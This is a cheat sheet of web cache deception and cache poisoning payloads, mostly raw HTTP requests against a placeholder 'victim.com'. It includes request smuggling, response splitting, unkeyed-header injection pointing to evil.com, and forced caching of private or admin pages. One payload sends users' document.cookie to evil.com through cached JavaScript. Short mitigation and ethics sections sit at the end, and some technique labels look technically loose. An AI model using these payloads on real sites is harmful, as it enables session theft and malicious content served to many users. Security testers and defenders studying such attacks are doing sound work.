# **Cache Deception & Poisoning Payload Cheat Sheet**

Cache deception exploits manipulate web caches (CDNs, reverse proxies) to store and serve malicious content to users. Below are various payloads for testing and exploiting cache-related vulnerabilities.

---

## **1. Basic Cache Poisoning Techniques**

### **Injecting Malicious Headers via Parameter Pollution**
```http
GET /profile?utm_id=123 HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
```

### **Cache Key Normalization Bypass**
```http
GET /index.php?param=test HTTP/1.1
Host: victim.com
X-Original-URL: /admin
```

---

## **2. Cache Deception via Path Manipulation**

### **Trailing Slash Trick (Stores /account/ as static page)**
```http
GET /account//profile.css HTTP/1.1
Host: victim.com
```

### **File Extension Trick (Stores JSON as cacheable)**
```http
GET /api/user.json?callback=malicious HTTP/1.1
Host: victim.com
```

---

## **3. Cache Poisoning via Header Injection**

### **Unkeyed Header Injection**
```http
GET / HTTP/1.1
Host: victim.com
X-Host: evil.com
```

### **Response Splitting for Cache Poisoning**
```http
GET /?param=test%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Hacked</h1> HTTP/1.1
Host: victim.com
```

---

## **4. Web Cache Deception (WCD) Exploits**

### **Forcing Cache of Private Data**
```http
GET /account/settings.css HTTP/1.1
Host: victim.com
Cookie: sessionid=USER_SESSION
```

### **Storing JSONP as Static Content**
```http
GET /user/data.json?callback=alert(1) HTTP/1.1
Host: victim.com
```

---

## **5. Cache Poisoning via HTTP Request Smuggling**

### **CL.TE Smuggling to Poison Cache**
```http
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0

GET /poisoned HTTP/1.1
Host: victim.com
```

### **TE.CL Smuggling with Cache Impact**
```http
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 6

0

GET /admin HTTP/1.1
Host: victim.com
```

---

## **6. DOM-Based Cache Poisoning**

### **Injecting Malicious JavaScript via Cached Fragment**
```html
<script>
  location = 'https://victim.com/home#<script>alert(1)</script>';
</script>
```

---

## **7. Cloud-Specific Cache Poisoning**

### **AWS CloudFront Cache Poisoning**
```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https,http
```

### **Akamai Cache-Control Bypass**
```http
GET /static/page.html HTTP/1.1
Host: victim.com
Pragma: akamai-x-get-cache-key
```

---

## **8. Cache Poisoning via Redirects**

### **Open Redirect + Cache Poisoning**
```http
GET /redirect?url=https://evil.com HTTP/1.1
Host: victim.com
X-Cache: HIT
```

### **Meta Tag Cache Poisoning**
```html
<meta http-equiv="refresh" content="0; url=https://victim.com/?malicious=payload">
```

---

## **9. Real-World Exploit Examples**

### **Stealing Session Cookies via Cached JS**
```http
GET /static/scripts.js?callback=document.write('<img src="https://evil.com/?c='+document.cookie+'>') HTTP/1.1
Host: victim.com
```

### **Admin Panel Cache Poisoning**
```http
GET /admin//style.css HTTP/1.1
Host: victim.com
Cookie: admin_session=LEGIT_SESSION
```

---

## **Testing Methodology**
1. **Identify Cacheable Endpoints** (static files, APIs with caching headers)
2. **Test Unkeyed Inputs** (headers, parameters not part of cache key)
3. **Verify Cache Storage** (observe `X-Cache: HIT` responses)
4. **Check for Cache Invalidation Flaws**
5. **Exploit Cache Poisoning for XSS/Data Theft**

---

## **Mitigation**
- **Validate all cache keys strictly**
- **Never cache sensitive content**
- **Implement proper `Vary` headers**
- **Use `Cache-Control: private` for user-specific data**
- **Regularly purge unused cache entries**

---

### **⚠️ Legal & Ethical Considerations**
- **Only test on authorized systems**
- **Cache poisoning can affect many users**
- **Disclose responsibly if found in production**

---

This cheat sheet covers various cache deception and poisoning techniques for penetration testing. Use responsibly! 🚀